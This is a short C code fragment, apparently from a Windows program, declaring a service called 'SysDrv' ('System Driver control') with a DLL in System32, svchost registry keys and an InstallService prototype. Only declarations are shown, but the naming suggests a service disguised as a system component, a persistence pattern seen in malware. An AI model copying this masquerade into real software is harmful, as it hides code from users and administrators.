char* serviceName	= "SysDrv";
char* displayName	= "System Driver control";
char* serviceDesc	= "System Driver control service.";

char* serviceDll	= "%SystemRoot%\\System32\\Services.dll";

#define SERVICE_KEY	"System\\CurrentControlSet\\Services"
#define SVCHOST_KEY "Software\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost"

BOOL InstallService(SC_HANDLE h, char* name);
